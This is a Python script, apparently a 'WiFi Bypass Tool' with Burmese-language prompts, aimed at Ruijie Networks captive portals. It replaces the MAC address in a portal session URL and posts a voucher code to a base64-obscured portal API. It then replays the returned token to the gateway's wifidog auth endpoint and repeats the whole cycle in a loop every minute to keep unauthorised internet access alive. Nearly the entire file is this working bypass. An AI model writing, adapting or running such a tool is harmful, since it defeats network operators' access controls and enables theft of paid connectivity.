import re
import requests
import base64
import os
import json
import asyncio
import ping3
from ping3 import ping
import time

CONFIG_FILE = "config_rshoka.json"

# Color codes
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
w = "\033[0m"
c = "\033[1;36m"

# Global variables for auto loop
auto_loop_running = False
loop_interval = 60  # 1 minute in seconds

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print("\033[1;35m" + "="*56)
    print("  ███╗   ███╗ ██████╗     ███████╗ █████╗ ██╗")
    print("  ████╗ ████║██╔════╝     ██╔════╝██╔══██╗██║")
    print("  ██╔████╔██║██║  ███╗    ███████╗███████║██║")
    print("  ██║╚██╔╝██║██║   ██║    ╚════██║██╔══██║██║")
    print("  ██║ ╚═╝ ██║╚██████╔╝    ███████║██║  ██║██║")
    print("  ╚═╝     ╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝╚═╝")
    print("="*56 + "\033[0m")
    print("\033[1;36m                 MG SAI - WiFi Bypass Tool\033[0m")
    print("\033[1;32m             Developer: @nain663 | Re-Builder @MGSai_4402\033[0m")
    print("\033[1;35m" + "="*56 + "\033[0m")

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_config(session_url, mac_address, voucher, gateway_ip):
    config = {
        "session_url": session_url,
        "mac_address": mac_address,
        "voucher": voucher,
        "gateway_ip": gateway_ip
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)       
    return url

def get_session_id(session_url, mac_address):
    final_url = replace_mac(session_url, mac_address)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': final_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie':'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    
    try:
        response = requests.get(final_url, headers=headers)
        session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url).group(1)
        return session_id
    except Exception as e:
        print(f"\033[1;31m[-] Error Getting Session ID: {e}\033[0m")
        return None

def login_voucher(session_id, voucher):
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 1
    }
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        with requests.post(post_url, json=data, headers=headers) as response:
            res_text = response.text
            return re.search('token=(.*?)&', res_text).group(1)
    except Exception as Error:
        print(f"\033[1;31m[-] Voucher Login Error: {Error}\033[0m")
        return None

async def get_smart_ping():
    """Ping စစ်ပြီး latency ကို အရောင်နဲ့ပြပေးမယ်"""
    targets = ["google.com", "8.8.8.8", "cloudflare.com"]
    
    print("\n" + "="*56)
    print("  📶 Checking Internet Connection...")
    print("="*56)
    
    connected = False
    best_result = None
    
    for target in targets:
        try:
            ping_result = await asyncio.to_thread(ping, target, timeout=2)
            
            if ping_result is not None:
                ping_ms = int(ping_result * 1000)
                connected = True
                
                if ping_ms >= 150:
                    color = r
                    status = "🔴 Poor"
                elif ping_ms >= 80:
                    color = y
                    status = "🟡 Fair"
                else:
                    color = g
                    status = "🟢 Excellent"
                
                print(f"  {color}✓{w} {target:15} → {color}{ping_ms:>4} ms{w}  {status}")
                
                if best_result is None or ping_ms < int(re.search(r'\d+', best_result).group() if best_result else '999'):
                    best_result = f"{color}{ping_ms} ms ({target}){w}"
            else:
                print(f"  {r}✗{w} {target:15} → {r}Timeout{w}")
                
        except Exception as e:
            print(f"  {r}✗{w} {target:15} → {r}Error{w}")
            continue
    
    print("="*56)
    
    if connected:
        print(f"\n  {g}✅ Internet Connected!{w}")
        return best_result if best_result else f"{g}Connected{w}"
    else:
        print(f"\n  {r}❌ No Internet Connection (Offline){w}")
        return f"{r}Offline{w}"

def do_bypass(session_url, mac_address, voucher, gateway_ip):
    """Bypass လုပ်ငန်းစဉ်"""
    session_id = get_session_id(session_url, mac_address)
    print(f"[+] Inactive Session Id: {session_id}")
    
    if not session_id:
        return False
        
    active_session_id = login_voucher(session_id, voucher)
    print(f"[+] Active Session Id: {active_session_id}")
    
    if not active_session_id:
        return False

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {
        'token': active_session_id,
        'phoneNumber': 'RshoKaUser',
    }
    
    try:
        final_req_url = f'http://{gateway_ip}:2060/wifidog/auth?'
        response_url = requests.get(final_req_url, params=params, headers=headers).url
        
        success_conditions = [
            "http://www.baidu.com", 
            "http://www.baidu.com/", 
            "http://portal-as.ruijienetworks.com/download/static/maccauth/src/success.html?",
            "success"
        ]
        
        if any(cond in response_url for cond in success_conditions):
            print("\n\033[1;32m[✓] Internet Bypass Successful! Enjoy your internet.\033[0m")
            return True
        else:
            print("\n\033[1;31m[-] Internet Bypass Failed or Unknown Response Route.\033[0m")
            return False
    except Exception as e:
        print(f"\n\033[1;31m[-] Auth Gateway connection error: {e}\033[0m")
        return False

async def auto_loop_bypass(session_url, mac_address, voucher, gateway_ip):
    """Auto loop bypass function"""
    global auto_loop_running
    auto_loop_running = True
    loop_count = 0
    
    print("\n" + "="*56)
    print("  🔄 Auto Bypass Loop Started")
    print(f"  ⏱️  Interval: {loop_interval} seconds (1 minute)")
    print("  ⏹️  Press Ctrl+C to stop")
    print("="*56)
    
    while auto_loop_running:
        loop_count += 1
        print(f"\n{'='*56}")
        print(f"  🔄 Loop #{loop_count} - {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*56}")
        
        # Run bypass
        success = do_bypass(session_url, mac_address, voucher, gateway_ip)
        
        if success:
            # Ping check
            result = await get_smart_ping()
            print(f"\n  📊 Ping Result: {result}")
        else:
            print("\n  ⚠️ Bypass failed, retrying in 1 minute...")
        
        # Wait for 1 minute
        print(f"\n  ⏳ Waiting 60 seconds before next loop...")
        for i in range(loop_interval, 0, -5):
            if not auto_loop_running:
                break
            if i % 10 == 0:
                print(f"  ⏱️  {i} seconds remaining...")
            await asyncio.sleep(5)
    
    print("\n  🛑 Auto loop stopped.")

def start_bypass():
    clear_screen()
    banner()
    
    config = load_config()
    
    old_url = config.get("session_url", "")
    old_mac = config.get("mac_address", "")
    old_voucher = config.get("voucher", "")
    old_ip = config.get("gateway_ip", "")
    
    print("\033[1;33m[+] WiFi အချက်အလက်များထည့်သွင်းပါ (ထည့်သွင်းပြီးသားဖြစ်ပါက Enter နှိပ်ပါ)\033[0m\n")
    
    if old_url:
        print(f"\033[1;34m[ Saved URL ]: {old_url[:50]}...\033[0m")
    session_url = input("\033[1;32m=> WiFi Session URL: \033[0m").strip() or old_url
    
    if not session_url:
        print("\033[1;31m[-] Session URL ထည့်သွင်းပါ!\033[0m")
        input("\nPress Enter to exit...")
        return

    if old_mac:
        print(f"\033[1;34m[ သိမ်းဆည်းထားသော MAC ]: {old_mac}\033[0m")
    mac_address = input("\033[1;32m=> MAC Address ထည့်ပါ (နမူနာ=10:3f:44:9d:b8:e4): \033[0m").strip() or old_mac

    if old_voucher:
        print(f"\033[1;34m[ သိမ်းဆည်းထားသော Voucher ]: {old_voucher}\033[0m")
    voucher = input("\033[1;32m=> Voucher Code ထည့်ပါ: \033[0m").strip() or old_voucher

    if old_ip:
        print(f"\033[1;34m[ သိမ်းဆည်းထားသော Gateway ]: {old_ip}\033[0m")
    gateway_ip = input("\033[1;32m=> Gateway IP ထည့်ပါ (နမူနာ= 192.168.60.1): \033[0m").strip() or old_ip

    save_config(session_url, mac_address, voucher, gateway_ip)
    
    print("\n\033[1;33m[*] Internet Bypass စတင်နေပါပြီ (Bypass Fail ပြပြီး Ping ပေါ်ရင်လဲ သုံးလို့ရပါတယ်)\033[0m")
    
    # First bypass
    success = do_bypass(session_url, mac_address, voucher, gateway_ip)
    
    # Ping check (Bypass အောင်သည်ဖြစ်စေ မအောင်သည်ဖြစ်စေ)
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(get_smart_ping())
        loop.close()
        print(f"\n  📊 Ping Result: {result}")
    except Exception as e:
        print(f"\n\033[1;31m[-] Ping Error: {e}\033[0m")
    
    # ===== Auto Loop ကို အလိုအလျောက် စတင်မယ် (မေးစရာမလိုဘူး) =====
    print("\n" + "="*56)
    print("  🔄 Starting Auto Bypass Loop automatically...")
    print("="*56)
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(auto_loop_bypass(session_url, mac_address, voucher, gateway_ip))
        loop.close()
    except KeyboardInterrupt:
        print("\n\n  🛑 Auto loop stopped by user.")
    except Exception as e:
        print(f"\n\033[1;31m[-] Auto loop error: {e}\033[0m")
    # ===== Auto Loop စပြီး =====
        
    input("\nPress Enter to exit...")

def main():
    start_bypass()

if __name__ == "__main__":
    main()